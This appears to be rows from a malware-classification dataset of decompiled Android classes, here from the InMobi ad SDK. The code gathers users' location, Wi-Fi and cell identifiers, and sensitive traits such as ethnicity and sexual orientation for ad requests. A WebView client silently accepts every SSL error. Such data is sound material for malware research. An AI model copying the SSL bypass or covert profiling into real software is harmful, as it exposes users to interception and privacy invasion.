"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.net\d.code","public class d implements Runnable {   d(){   }   @Override public void run(){     try {       if (WebviewLoader.this.c != null) {         WebviewLoader.this.c.stopLoading();         WebviewLoader.this.c.destroy();         WebviewLoader.this.c=null;         WebviewLoader.b.set(false);       }     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Exception deinit webview "",e);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.net\HttpRequestBuilder.code","public final class HttpRequestBuilder {   public static String buildPostBody(  UserInfo userInfo,  WifiInfo wifiInfo,  RequestResponseManager.ActionType actionType){     StringBuffer stringBuffer=new StringBuffer();     try {       String a=a(userInfo,wifiInfo);       if (RequestResponseManager.ActionType.AdRequest == actionType) {         stringBuffer.append(""requestactivity=AdRequest"");       }  else       if (RequestResponseManager.ActionType.AdRequest_Interstitial == actionType) {         stringBuffer.append(""adtype=int"");       }       if (a != null && !a.equalsIgnoreCase("""")) {         stringBuffer.append(""&"" + a);       }       String a2=a(userInfo);       if (a2 != null && !"""".equals(a2)) {         stringBuffer.append(""&"" + a2);       }       String b=b(userInfo);       if (b != null && !"""".equals(b)) {         stringBuffer.append(""&"" + b);       }     }  catch (    Exception e) {       Log.debug(ConfigConstants.LOGGING_TAG,""Exception occured in an ad request"" + e);     }     return stringBuffer.toString();   }   private static String a(  UserInfo userInfo,  WifiInfo wifiInfo){     try {       StringBuilder sb=new StringBuilder();       if (userInfo.getPostalCode() != null) {         sb.append(""u-postalCode="");         sb.append(getURLEncoded(userInfo.getPostalCode()));       }       if (SDKUtil.getQAMode()) {         sb.append(""&mk-carrier=117.97.87.6"");         sb.append(""&x-real-ip=117.97.87.6"");       }       if (userInfo.getRequestParams() != null) {         for (        Map.Entry<String,String> entry : userInfo.getRequestParams().entrySet()) {           sb.append(""&"").append(getURLEncoded(entry.getKey().toString())).append(""="").append(getURLEncoded(entry.getValue().toString()));         }       }       if (userInfo.getAreaCode() != null) {         sb.append(""&u-areaCode="");         sb.append(getURLEncoded(userInfo.getAreaCode()));       }       if (userInfo.getDateOfBirth() != null) {         sb.append(""&u-dateOfBirth="");         sb.append(getURLEncoded(userInfo.getDateOfBirth()));       }       if (userInfo.getGender() != null) {         sb.append(""&u-gender="");         sb.append(userInfo.getGender().toString().toLowerCase());       }       if (userInfo.getKeywords() != null) {         sb.append(""&p-keywords="");         sb.append(getURLEncoded(userInfo.getKeywords()));       }       if (userInfo.getSearchString() != null) {         sb.append(""&p-type="");         sb.append(getURLEncoded(userInfo.getSearchString()));       }       if (userInfo.getIncome() > 0) {         sb.append(""&u-income="");         sb.append(userInfo.getIncome());       }       if (userInfo.getEducation() != null) {         sb.append(""&u-education="");         sb.append(userInfo.getEducation().toString().toLowerCase());       }       if (userInfo.getEthnicity() != null) {         sb.append(""&u-ethnicity="");         sb.append(userInfo.getEthnicity().toString().toLowerCase());       }       if (userInfo.getAge() > 0) {         sb.append(""&u-age="");         sb.append(userInfo.getAge());       }       if (userInfo.getInterests() != null) {         sb.append(""&u-interests="");         sb.append(getURLEncoded(userInfo.getInterests()));       }       if (userInfo.getLocationWithCityStateCountry() != null) {         sb.append(""&u-location="");         sb.append(getURLEncoded(userInfo.getLocationWithCityStateCountry()));       }       if (userInfo.getMaritalStatus() != null) {         sb.append(""&u-marital="");         sb.append(userInfo.getMaritalStatus().toString().toLowerCase());       }       if (userInfo.getHasChildren() != null) {         sb.append(""&u-haschildren="");         sb.append(userInfo.getHasChildren().toString().toLowerCase());       }       if (userInfo.getLanguage() != null) {         sb.append(""&u-language="");         sb.append(getURLEncoded(userInfo.getLanguage()));       }       if (userInfo.getSexualOrientation() != null) {         sb.append(""&u-sexualorientation="");         sb.append(userInfo.getSexualOrientation().toString().toLowerCase());       }       Calendar calendar=Calendar.getInstance();       System.currentTimeMillis();       sb.append(""&ts="" + calendar.getTimeInMillis());       sb.append(""&tz="").append(calendar.get(16) + calendar.get(15));       if (wifiInfo != null) {         sb.append(""&c-ap-bssid="" + wifiInfo.bssid);       }       try {         String str=CellUtil.getCurrentCellTower(InternalSDKUtil.getContext()).id;         if (str != null && !"""".equals(str)) {           sb.append(""&c-sid="" + str);         }       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception getting cell tower id"",e);       }       String sb2=sb.toString();       return sb2.charAt(0) == '&' ? sb2.substring(1) : sb2;     }  catch (    Exception e2) {       Log.internal(ConfigConstants.LOGGING_TAG,""Couldn't build post string in IMHttpRequestBuilder"",e2);       return null;     }   }   private static String a(  UserInfo userInfo){     try {       StringBuilder sb=new StringBuilder();       if (userInfo.getScreenDensity() != null) {         sb.append(""d-device-screen-density="").append(getURLEncoded(userInfo.getScreenDensity()));       }       if (userInfo.getScreenSize() != null) {         sb.append(""&d-device-screen-size="").append(getURLEncoded(userInfo.getScreenSize()));       }       String sb2=sb.toString();       if (sb2.charAt(0) == '&') {         return sb2.substring(1);       }       return sb2;     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Couldn't build post string in IMHttpRequestBuilder"",e);       return null;     }   }   private static String b(  UserInfo userInfo){     try {       StringBuilder sb=new StringBuilder();       if (userInfo.getSiteId() != null) {         sb.append(""mk-siteid="");         sb.append(getURLEncoded(userInfo.getSiteId()));       }       if (userInfo.getUIDMapEncrypted() != null) {         sb.append(""&u-id-map="");         sb.append(getURLEncoded(userInfo.getUIDMapEncrypted()));         sb.append(""&u-id-key="");         sb.append(userInfo.getRandomKey());         sb.append(""&u-key-ver="");         sb.append(userInfo.getRsakeyVersion());       }       if (userInfo.getAid() != null) {         sb.append(""&aid="");         sb.append(getURLEncoded(userInfo.getAid()));       }       sb.append(""&mk-version="");       String str=""pr-SAND-"" + InternalSDKUtil.getInMobiInternalVersion(""4.1.1"") + ""-""+ InternalSDKUtil.INMOBI_SDK_RELEASE_DATE;       sb.append(getURLEncoded(str));       sb.append(""&mk-rel-version="");       sb.append(getURLEncoded(str));       sb.append(""&format=imai"");       sb.append(""&mk-ads=1"");       sb.append(""&h-user-agent="");       sb.append(getURLEncoded(userInfo.getPhoneDefaultUserAgent()));       sb.append(""&u-appbid="");       sb.append(getURLEncoded(userInfo.getAppBId()));       sb.append(""&u-appDNM="");       sb.append(getURLEncoded(userInfo.getAppDisplayName()));       sb.append(""&u-appver="");       sb.append(getURLEncoded(userInfo.getAppVer()));       sb.append(""&d-localization="");       sb.append(getURLEncoded(userInfo.getLocalization()));       if (userInfo.getNetworkType() != null) {         sb.append(""&d-netType="");         sb.append(getURLEncoded(userInfo.getNetworkType()));       }       if (userInfo.getOrientation() != 0) {         sb.append(""&d-orientation="");         sb.append(userInfo.getOrientation());       }       sb.append(""&mk-ad-slot="");       sb.append(getURLEncoded(userInfo.getAdUnitSlot()));       if (userInfo.getSlotId() != null) {         sb.append(""&mk-site-slotid="");         sb.append(getURLEncoded(userInfo.getSlotId()));       }       if (userInfo.isValidGeoInfo()) {         sb.append(""&u-latlong-accu="");         sb.append(getURLEncoded(currentLocationStr(userInfo)));         sb.append(""&u-ll-ts="");         sb.append(userInfo.getGeoTS());       }       if (userInfo.getRefTagKey() != null && userInfo.getRefTagValue() != null) {         sb.append(""&"").append(getURLEncoded(userInfo.getRefTagKey())).append(""="").append(getURLEncoded(userInfo.getRefTagValue()));       }       String sb2=sb.toString();       if (sb2.charAt(0) == '&') {         return sb2.substring(1);       }       return sb2;     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Couldn't build post string in IMHttpRequestBuilder"",e);       return null;     }   }   public static String currentLocationStr(  UserInfo userInfo){     StringBuilder sb=new StringBuilder();     if (sb == null || !userInfo.isValidGeoInfo()) {       return """";     }     sb.append(userInfo.getLat());     sb.append("","");     sb.append(userInfo.getLon());     sb.append("","");     sb.append((int)userInfo.getLocAccuracy());     return sb.toString();   }   public static String getURLEncoded(  String str){     try {       return URLEncoder.encode(str,""UTF-8"");     }  catch (    Exception e) {       return """";     }   }   public static String getURLDecoded(  String str,  String str2){     try {       return URLDecoder.decode(str,str2);     }  catch (    Exception e) {       return """";     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.net\HttpRequestCallback.code","public interface HttpRequestCallback {   public static final int HTTP_FAILURE=1;   public static final int HTTP_SUCCESS=0;   void notifyResult(  int i,  Object obj); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.net\MyWebViewClient.code","protected static class MyWebViewClient extends WebViewClient {   protected MyWebViewClient(){   }   @Override public void onReceivedError(  WebView webView,  int i,  String str,  String str2){     try {       Log.internal(ConfigConstants.LOGGING_TAG,""Processing click in webview error "" + i + "" Failing url: ""+ str2+ ""Error description ""+ str);       WebviewLoader.b.set(false);       RequestResponseManager.c.set(false);       super.onReceivedError(webView,i,str,str2); synchronized (RequestResponseManager.a) {         RequestResponseManager.a.notify();       }     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Exception onReceived error callback webview"",e);     }   }   @Override public void onPageFinished(  WebView webView,  String str){     try {       Log.internal(ConfigConstants.LOGGING_TAG,""On page Finished "" + str);       if (WebviewLoader.b.compareAndSet(true,false)) {         RequestResponseManager.c.set(true); synchronized (RequestResponseManager.a) {           RequestResponseManager.a.notify();         }       }       super.onPageFinished(webView,str);     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Exception onPageFinished"",e);     }   }   @Override public boolean shouldOverrideUrlLoading(  WebView webView,  String str){     Log.internal(ConfigConstants.LOGGING_TAG,""Should override "" + str);     webView.loadUrl(str);     return true;   }   @Override public void onReceivedSslError(  WebView webView,  SslErrorHandler sslErrorHandler,  SslError sslError){     Log.internal(ConfigConstants.LOGGING_TAG,""SSL Error.Webview will proceed "" + sslError);     sslErrorHandler.proceed();     super.onReceivedSslError(webView,sslErrorHandler,sslError);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.net\RequestResponseManager.code","public final class RequestResponseManager {   static Thread a;   public static AtomicBoolean isSynced;   private HttpURLConnection e;   public static IMAIClickEventList mNetworkQueue=null;   public static IMAIClickEventList mDBWriterQueue=new IMAIClickEventList();   private static AtomicBoolean f=null;   static Handler b=new Handler();   static AtomicBoolean c=null;   private static AtomicBoolean h=null;   private AtomicBoolean d=new AtomicBoolean();   private WebviewLoader g=null;   public enum ActionType {  AdRequest,   AdRequest_Interstitial}   public void init(){     try {       if (mNetworkQueue == null) {         mNetworkQueue=IMAIClickEventList.getLoggedClickEvents();       }       if (f == null) {         f=new AtomicBoolean(false);       }       h=new AtomicBoolean(true);       isSynced=new AtomicBoolean(false);       c=new AtomicBoolean(false);     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Request Response Manager init failed"",e);     }   }   public void deinit(){     try {       if (f != null) {         f.set(false);       }       if (mDBWriterQueue != null) {         mDBWriterQueue.saveClickEvents();         mDBWriterQueue.clear();       }       isSynced.set(false);       if (mNetworkQueue != null) {         mNetworkQueue.clear();       }       mNetworkQueue=null;     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Request Response Manager deinit failed"",e);     }   }   public void doCancel(){     this.d.set(true);     if (this.e != null) {       new c().start();     }   } class c extends Thread {     c(){     }     @Override public void run(){       try {         RequestResponseManager.this.e.disconnect();       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception in closing connection "",e);       }     }   }   public void a(  int i,  Object obj,  HttpRequestCallback httpRequestCallback){     if (!this.d.get() && httpRequestCallback != null) {       httpRequestCallback.notifyResult(i,obj);     }   } class a extends Thread {     final UserInfo a;     final String b;     final ActionType c;     final HttpRequestCallback d;     a(    UserInfo userInfo,    String str,    ActionType actionType,    HttpRequestCallback httpRequestCallback){       this.a=userInfo;       this.b=str;       this.c=actionType;       this.d=httpRequestCallback;     }     @Override public void run(){       WifiInfo wifiInfo=null;       try {         try {           wifiInfo=IceDataCollector.getConnectedWifiInfo(this.a.getApplicationContext());         }  catch (        Exception e) {           try {             Log.internal(ConfigConstants.LOGGING_TAG,""No wifi permissions set, unable to send wifi data"");           }  catch (          Exception e2) {             Log.debug(ConfigConstants.LOGGING_TAG,""Exception retrieving ad "",e2);             RequestResponseManager.this.a(1,AdRequest.ErrorCode.INTERNAL_ERROR,this.d);             return;           }         }         Log.debug(ConfigConstants.LOGGING_TAG,""Ad Serving URL: "" + this.b);         String buildPostBody=HttpRequestBuilder.buildPostBody(this.a,wifiInfo,this.c);         Log.debug(ConfigConstants.LOGGING_TAG,buildPostBody);         RequestResponseManager.this.e=RequestResponseManager.this.a(this.b,this.a);         RequestResponseManager.this.a(buildPostBody);         RequestResponseManager.this.a(0,RequestResponseManager.this.a(this.a),this.d);       }  catch (      AdException e3) {         Log.debug(ConfigConstants.LOGGING_TAG,""Exception retrieving ad "",e3);         RequestResponseManager.this.a(1,e3,this.d);       } catch (      IOException e4) {         Log.debug(ConfigConstants.LOGGING_TAG,""Exception retrieving ad "",e4);         if (!(e4 instanceof SocketTimeoutException)) {           RequestResponseManager.this.a(1,AdRequest.ErrorCode.NETWORK_ERROR,this.d);         }  else {           Log.internal(ConfigConstants.LOGGING_TAG,""Server Timeout"");           RequestResponseManager.this.a(1,AdRequest.ErrorCode.AD_FETCH_TIMEOUT,this.d);         }       }     }   }   public void asyncRequestAd(  UserInfo userInfo,  ActionType actionType,  String str,  HttpRequestCallback httpRequestCallback){     new a(userInfo,str,actionType,httpRequestCallback).start();   }   public HttpURLConnection a(  String str,  UserInfo userInfo) throws IOException {     this.e=(HttpURLConnection)new URL(str).openConnection();     InternalSDKUtil.addCommonPropertiesToConnection(this.e);     a(this.e,userInfo);     return this.e;   }   public void a(  String str) throws IOException {     BufferedWriter bufferedWriter;     this.e.setRequestProperty(""Content-Length"",Integer.toString(str.length()));     try {       bufferedWriter=new BufferedWriter(new OutputStreamWriter(this.e.getOutputStream()));     }  catch (    Throwable th) {       th=th;       bufferedWriter=null;     }     try {       bufferedWriter.write(str);       a(bufferedWriter);     }  catch (    Throwable th2) {       th=th2;       a(bufferedWriter);       throw th;     }   }   private void a(  Closeable closeable){     if (closeable != null) {       try {         closeable.close();       }  catch (      IOException e) {         Log.debug(ConfigConstants.LOGGING_TAG,""Exception closing resource: "" + closeable,e);       }     }   }   private static void a(  HttpURLConnection httpURLConnection,  UserInfo userInfo) throws ProtocolException {     int fetchTimeOut=Initializer.getConfigParams().getFetchTimeOut();     httpURLConnection.setConnectTimeout(fetchTimeOut);     httpURLConnection.setReadTimeout(fetchTimeOut);     httpURLConnection.setRequestProperty(""user-agent"",userInfo.getPhoneDefaultUserAgent());     httpURLConnection.setUseCaches(false);     httpURLConnection.setDoOutput(true);     httpURLConnection.setDoInput(true);     httpURLConnection.setRequestMethod(""POST"");     httpURLConnection.setRequestProperty(""content-type"",""application/x-www-form-urlencoded"");   }   public Response a(  UserInfo userInfo) throws AdException, IOException {     BufferedReader bufferedReader;     Log.debug(ConfigConstants.LOGGING_TAG,""Http Status Code: "" + this.e.getResponseCode());     int responseCode=this.e.getResponseCode();     String headerField=this.e.getHeaderField(ConfigConstants.IMP_ID_KEY);     Log.debug(ConfigConstants.LOGGING_TAG,""Im Id: "" + headerField);     String headerField2=this.e.getHeaderField(ConfigConstants.SANDBOX_ERR_KEY);     if (headerField2 != null) {       Log.debug(ConfigConstants.LOGGING_TAG,""Sandbox error Id: "" + headerField2);     }     try {       if (responseCode == 200) {         bufferedReader=new BufferedReader(new InputStreamReader(this.e.getInputStream(),""UTF-8""));         try {           StringBuilder sb=new StringBuilder();           while (true) {             String readLine=bufferedReader.readLine();             if (readLine != null) {               sb.append(readLine).append(""\n"");             }  else {               String sb2=sb.toString();               Log.debug(ConfigConstants.LOGGING_TAG,""Ad Response: "" + sb2);               Response response=new Response(headerField,sb2);               this.e.disconnect();               a(bufferedReader);               return response;             }           }         }  catch (        Throwable th) {           th=th;           this.e.disconnect();           a(bufferedReader);           throw th;         }       }  else {         if (responseCode == 204) {           Log.debug(ConfigConstants.LOGGING_TAG,""Server returned No fill"");           throw new AdException(""Server did not return 200."",100,headerField,responseCode);         }         if (responseCode == 400) {           Log.debug(ConfigConstants.LOGGING_TAG,""Invalid App Id.Please check the app Id in the adrequest is valid and in active state"");           throw new AdException(""Server did not return 200."",AdException.INVALID_APP_ID,headerField,responseCode);         }         Log.debug(ConfigConstants.LOGGING_TAG,""Server Error"");         throw new AdException(""Server did not return 200."",AdException.INTERNAL_ERROR,headerField,responseCode);       }     }  catch (    Throwable th2) {       th=th2;       bufferedReader=null;     }   } class b implements Runnable {     final Context a;     final HttpRequestCallback b;     b(    Context context,    HttpRequestCallback httpRequestCallback){       this.a=context;       this.b=httpRequestCallback;     }     @Override public void run(){       while (!RequestResponseManager.isSynced.get()) {         try {           RequestResponseManager.isSynced.set(true);           if (RequestResponseManager.mNetworkQueue == null || RequestResponseManager.mNetworkQueue.isEmpty()) {             if (RequestResponseManager.mDBWriterQueue == null && RequestResponseManager.mDBWriterQueue.isEmpty()) {               Log.internal(ConfigConstants.LOGGING_TAG,""Click event list empty"");               RequestResponseManager.this.deinit();               return;             }  else {               RequestResponseManager.mNetworkQueue.addAll(RequestResponseManager.mDBWriterQueue);               RequestResponseManager.mDBWriterQueue.clear();             }           }           while (!RequestResponseManager.mNetworkQueue.isEmpty()) {             try {               ClickData remove=RequestResponseManager.mNetworkQueue.remove(0);               String clickUrl=remove.getClickUrl();               int retryCount=remove.getRetryCount();               boolean isPingWv=remove.isPingWv();               boolean isFollowRedirects=remove.isFollowRedirects();               int retryInterval=Initializer.getConfigParams().getImai().getRetryInterval();               if (!InternalSDKUtil.checkNetworkAvailibility(this.a)) {                 Log.internal(ConfigConstants.LOGGING_TAG,""Cannot process click. Network Not available"");                 if (retryCount > 1) {                   RequestResponseManager.mDBWriterQueue.add(remove);                 }                 if (this.b != null) {                   this.b.notifyResult(1,null);                 }                 RequestResponseManager.this.deinit();                 return;               }               int maxRetry=Initializer.getConfigParams().getImai().getMaxRetry();               if (!RequestResponseManager.h.get() && retryCount < maxRetry) {                 Log.internal(ConfigConstants.LOGGING_TAG,""Retrying to ping in background after "" + (retryInterval / 1000) + "" secs""); synchronized (RequestResponseManager.a) {                   try {                     RequestResponseManager.a.wait(retryInterval);                   }  catch (                  InterruptedException e) {                     Log.internal(ConfigConstants.LOGGING_TAG,""Network thread wait failure"",e);                   }                 }               }               Log.internal(ConfigConstants.LOGGING_TAG,""Processing click in background: "" + clickUrl);               if (isPingWv) {                 if (RequestResponseManager.this.processClickUrlInWebview(clickUrl)) {                   Log.internal(ConfigConstants.LOGGING_TAG,""Ping in webview successful: "" + clickUrl);                   if (this.b != null) {                     this.b.notifyResult(0,null);                   }                 }  else {                   remove.setRetryCount(retryCount - 1);                   if (retryCount > 1) {                     RequestResponseManager.mDBWriterQueue.add(remove);                   }                   Log.internal(ConfigConstants.LOGGING_TAG,""Ping in webview failed: "" + clickUrl);                   if (this.b != null) {                     this.b.notifyResult(1,null);                   }                 }               }  else               if (RequestResponseManager.this.processClickHttpClient(clickUrl,isFollowRedirects)) {                 Log.internal(ConfigConstants.LOGGING_TAG,""Ping successful: "" + clickUrl);                 if (this.b != null) {                   this.b.notifyResult(0,null);                 }               }  else {                 remove.setRetryCount(retryCount - 1);                 if (retryCount > 1) {                   RequestResponseManager.mDBWriterQueue.add(remove);                 }                 Log.internal(ConfigConstants.LOGGING_TAG,""Ping  failed: "" + clickUrl);                 if (this.b != null) {                   this.b.notifyResult(1,null);                 }                 Log.internal(ConfigConstants.LOGGING_TAG,""Ping failed: "" + clickUrl);               }               if (RequestResponseManager.mDBWriterQueue.size() > Initializer.getConfigParams().getImai().getmDefaultEventsBatch()) {                 RequestResponseManager.mDBWriterQueue.saveClickEvents();                 RequestResponseManager.mDBWriterQueue.clear();               }             }  catch (            Exception e2) {               Log.internal(ConfigConstants.LOGGING_TAG,""Exception pinging click in background"",e2);               RequestResponseManager.this.deinit();               return;             }           }         }  catch (        Exception e3) {           Log.internal(ConfigConstants.LOGGING_TAG,""Exception ping to server "",e3);           return;         }       }       RequestResponseManager.this.deinit();     }   }   public void processClick(  Context context,  HttpRequestCallback httpRequestCallback){     try {       if (f.compareAndSet(false,true)) {         a=new Thread(new b(context,httpRequestCallback));         a.setPriority(1);         a.start();       }     }  catch (    Exception e) {       Log.internal(ConfigConstants.LOGGING_TAG,""Exception ping "",e);     }   }   public boolean processClickHttpClient(  java.lang.String r8,  boolean r9){     throw new UnsupportedOperationException(""Method not decompiled: com.inmobi.androidsdk.impl.net.RequestResponseManager.processClickHttpClient(java.lang.String, boolean):boolean"");   }   public boolean processClickUrlInWebview(  String str){     try {       Log.internal(ConfigConstants.LOGGING_TAG,""Processing click in webview "" + str);       this.g=new WebviewLoader(InternalSDKUtil.getContext());       int pingTimeOut=Initializer.getConfigParams().getImai().getPingTimeOut();       HashMap<String,String> hashMap=null;       if (SDKUtil.getQAMode()) {         hashMap=new HashMap<>();         hashMap.put(""mk-carrier"",""117.97.87.6"");         hashMap.put(""x-real-ip"",""117.97.87.6"");       }       this.g.loadInWebview(str,hashMap); synchronized (a) {         try {           a.wait(pingTimeOut);         }  catch (        InterruptedException e) {           Log.internal(ConfigConstants.LOGGING_TAG,""Network thread wait failure"",e);         }       }       if (true == c.get()) {         h.set(true);       }  else {         h.set(false);         WebviewLoader.b.set(false);       }       this.g.deinit(pingTimeOut);       return c.get();     }  catch (    Exception e2) {       Log.internal(ConfigConstants.LOGGING_TAG,""ping in webview exception"",e2);       return c.get();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.net\Response.code","public class Response {   String a;   String b;   public Response(  String str,  String str2){     this.a=null;     this.b=null;     this.a=str;     this.b=str2;   }   public String getAdResponse(){     return this.b;   }   public String getImpressionId(){     return this.a;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.androidsdk.impl.net\WebviewLoader.code","public class WebviewLoader {   static boolean a=false;   static AtomicBoolean b=null;   private WebView c=null; class c implements Runnable {     final Context a;     c(    Context context){       this.a=context;     }     @Override public void run(){       try {         WebviewLoader.this.c=new WebView(this.a);         WebviewLoader.b=new AtomicBoolean(false);         WebviewLoader.this.c.setWebViewClient(new MyWebViewClient());         WebviewLoader.this.c.getSettings().setJavaScriptEnabled(true);         WebviewLoader.this.c.getSettings().setPluginState(WebSettings.PluginState.ON);         WebviewLoader.this.c.getSettings().setCacheMode(2);       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception init webview"",e);       }     }   }   public WebviewLoader(  Context context){     RequestResponseManager.b.post(new c(context));   } public class d implements Runnable {     d(){     }     @Override public void run(){       try {         if (WebviewLoader.this.c != null) {           WebviewLoader.this.c.stopLoading();           WebviewLoader.this.c.destroy();           WebviewLoader.this.c=null;           WebviewLoader.b.set(false);         }       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception deinit webview "",e);       }     }   }   public void deinit(  int i){     RequestResponseManager.b.postDelayed(new d(),i);   } class a implements Runnable {     a(){     }     @Override public void run(){       try {         if (WebviewLoader.this.c != null) {           WebviewLoader.b.set(false);         }         WebviewLoader.this.c.stopLoading();       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception stop loading"",e);       }     }   }   public void stopLoading(){     RequestResponseManager.b.post(new a());   } public class b implements Runnable {     final String a;     final HashMap b;     b(    String str,    HashMap hashMap){       this.a=str;       this.b=hashMap;     }     @Override public void run(){       try {         WebviewLoader.b.set(true);         WebviewLoader.this.c.loadUrl(this.a,this.b);       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception load in webview"",e);       }     }   }   public void loadInWebview(  String str,  HashMap<String,String> hashMap){     RequestResponseManager.b.post(new b(str,hashMap));   } protected static class MyWebViewClient extends WebViewClient {     protected MyWebViewClient(){     }     @Override public void onReceivedError(    WebView webView,    int i,    String str,    String str2){       try {         Log.internal(ConfigConstants.LOGGING_TAG,""Processing click in webview error "" + i + "" Failing url: ""+ str2+ ""Error description ""+ str);         WebviewLoader.b.set(false);         RequestResponseManager.c.set(false);         super.onReceivedError(webView,i,str,str2); synchronized (RequestResponseManager.a) {           RequestResponseManager.a.notify();         }       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception onReceived error callback webview"",e);       }     }     @Override public void onPageFinished(    WebView webView,    String str){       try {         Log.internal(ConfigConstants.LOGGING_TAG,""On page Finished "" + str);         if (WebviewLoader.b.compareAndSet(true,false)) {           RequestResponseManager.c.set(true); synchronized (RequestResponseManager.a) {             RequestResponseManager.a.notify();           }         }         super.onPageFinished(webView,str);       }  catch (      Exception e) {         Log.internal(ConfigConstants.LOGGING_TAG,""Exception onPageFinished"",e);       }     }     @Override public boolean shouldOverrideUrlLoading(    WebView webView,    String str){       Log.internal(ConfigConstants.LOGGING_TAG,""Should override "" + str);       webView.loadUrl(str);       return true;     }     @Override public void onReceivedSslError(    WebView webView,    SslErrorHandler sslErrorHandler,    SslError sslError){       Log.internal(ConfigConstants.LOGGING_TAG,""SSL Error.Webview will proceed "" + sslError);       sslErrorHandler.proceed();       super.onReceivedSslError(webView,sslErrorHandler,sslError);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons\a.code","static class a implements ApplicationFocusManager.FocusChangedListener {   a(){   }   @Override public void onFocusChanged(  boolean z){     if (z) {       AnalyticsEventsWrapper.getInstance().startSession(InMobi.a,null);     }  else {       AnalyticsEventsWrapper.getInstance().endSession(null);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons\InMobi.code","public final class InMobi {   public static final int EXCLUDE_FB_ID=4;   public static final int EXCLUDE_ODIN1=2;   public static final int EXCLUDE_UM5_ID=8;   public static final int ID_DEVICE_NONE=0;   public static final int INCLUDE_DEFAULT=1;   private static String a=null;   private InMobi(){   }   public static String getAppId(){     return a;   }   public static void initialize(  Activity activity,  String str){     if (activity != null) {       try {         InternalSDKUtil.getUserAgent(activity.getApplicationContext());       }  catch (      Exception e) {       }     }     if (a != null) {       ThinICE.start(activity);       return;     }     if (activity == null) {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Application Context NULL"");       Log.debug(InternalSDKUtil.LOGGING_TAG,AdTrackerConstants.MSG_APP_CONTEXT_NULL);       return;     }     if (str == null) {       Log.debug(InternalSDKUtil.LOGGING_TAG,""APP ID Cannot be NULL"");       Log.debug(InternalSDKUtil.LOGGING_TAG,AdTrackerConstants.MSG_APP_ID_NULL);       return;     }     if (str == null || """".equals(str.trim())) {       Log.debug(InternalSDKUtil.LOGGING_TAG,AdTrackerConstants.MSG_APP_ID_EMPTY);       return;     }     Context applicationContext=activity.getApplicationContext();     InternalSDKUtil.setContext(applicationContext);     Log.debug(InternalSDKUtil.LOGGING_TAG,""InMobi init successful"");     a=str.trim();     ThinICE.start(activity);     IMAdTracker.getInstance().init(applicationContext,str);     IMAdTracker.getInstance().reportAppDownloadGoal();     ApplicationFocusManager.init(activity);     ApplicationFocusManager.addFocusChangedListener(new a());     AnalyticsEventsWrapper.getInstance().startSession(a,null);     ActivityRecognitionManager.init(activity.getApplicationContext());     UserInfo.getInstance().setActivity(activity);     UserInfo.getInstance().updateInfo();   } static class a implements ApplicationFocusManager.FocusChangedListener {     a(){     }     @Override public void onFocusChanged(    boolean z){       if (z) {         AnalyticsEventsWrapper.getInstance().startSession(InMobi.a,null);       }  else {         AnalyticsEventsWrapper.getInstance().endSession(null);       }     }   }   public enum LOG_LEVEL {  NONE(0),   DEBUG(1),   VERBOSE(2);   private final int a;   LOG_LEVEL(  int i){     this.a=i;   }   public int getValue(){     return this.a;   } }   public static void setLogLevel(  LOG_LEVEL log_level){     if (log_level == LOG_LEVEL.NONE) {       Log.setInternalLogLevel(Log.INTERNAL_LOG_LEVEL.NONE);     }  else     if (log_level == LOG_LEVEL.DEBUG) {       Log.setInternalLogLevel(Log.INTERNAL_LOG_LEVEL.DEBUG);     }  else {       Log.setInternalLogLevel(Log.INTERNAL_LOG_LEVEL.INTERNAL);     }   }   public static String getVersion(){     return ""4.1.1"";   }   public static void setDeviceIDMask(  int i){     UserInfo.getInstance().setDeviceIDMask(i);   }   public static void setLocationInquiryAllowed(  boolean z){     UserInfo.getInstance().setLocationInquiryAllowed(z);   }   public static void setCurrentLocation(  Location location){     if (location != null) {       UserInfo.getInstance().setCurrentLocation(location);     }  else {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Location cannot be null"");     }   }   public static void setLocationWithCityStateCountry(  String str,  String str2,  String str3){     UserInfo.getInstance().setLocationWithCityStateCountry(str,str2,str3);   }   public static void setPostalCode(  String str){     if (str != null && !"""".equals(str.trim())) {       UserInfo.getInstance().setPostalCode(str);     }  else {       Log.debug(InternalSDKUtil.LOGGING_TAG,""Postal Code cannot be null"");     }   }   public static void setAreaCode(  String str){     if (str != null && !"""".equals(str.trim())) {       UserInfo.getInstance().setAreaCode(str);     }  